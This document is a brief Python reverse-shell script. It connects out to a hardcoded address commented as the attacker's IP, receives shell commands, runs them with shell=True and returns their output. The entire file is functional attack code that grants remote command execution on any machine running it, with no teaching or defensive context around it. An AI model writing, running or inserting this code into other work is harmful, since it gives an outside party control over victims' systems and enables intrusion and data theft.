import socket
import subprocess

HOST = "172.28.70.103"  # attacker IP
PORT = 8880

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

while True:
    command = client.recv(4096).decode()

    if command.lower() == "exit":
        break

    try:
        output = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT
        )
    except subprocess.CalledProcessError as e:
        output = e.output

    client.send(output if output else b" ")

client.close()
